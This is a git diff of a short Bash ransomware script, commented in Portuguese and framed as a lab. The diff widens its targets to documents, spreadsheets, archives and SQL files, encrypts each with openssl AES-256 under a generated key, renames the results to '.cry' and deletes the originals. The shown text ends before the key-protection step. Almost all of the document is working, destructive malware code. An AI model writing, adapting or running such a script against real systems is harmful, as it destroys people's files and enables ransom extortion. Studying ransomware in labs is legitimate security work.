@@ -1,8 +1,11 @@
 #!/bin/bash
+#################################
+# Autor: Rafael Vergani 	#
+# https://github.com/vergani 	#
+#################################
 
-# local que quero criptografar neste lab:
-
-arquivos=$(ls)
+# local e exntesões de arquivos que serão atacadas neste lab:
+arquivos=$(ls *.txt *.tar *.gzip *.doc *.docx *.xls *.xlsx *.ppt *.pptx *.sql)
 
 # variavel que vai armazenar chave privada para decriptar
 chave=$(/usr/bin/dbus-uuidgen)
@@ -12,12 +15,10 @@ echo $chave > chave.key
 # vamos ler todos os arquivos da pasta desejada, exceto arquivos que vou precisar depois:
 for file in $arquivos
 do
-	if [ "$file" != "ranso.sh" ] && [ "$file" != "chave.key" ] && [ "$file" != "resgate.sh" ]
-	then
-		# agora vamos encriptar tudo usando a chave desejada
-		openssl enc -in $file -out $file".enc" -e -aes256 -k chave.key 
-		rm $file
-	fi
+	# agora vamos encriptar tudo usando a chave desejada
+	openssl enc -in $file -out $file".cry" -e -aes256 -k chave.key 
+	rm $file
+
 done
 
 # vamos gerar um nova chave para proteger minha chave privada que precisareis depois no resgate
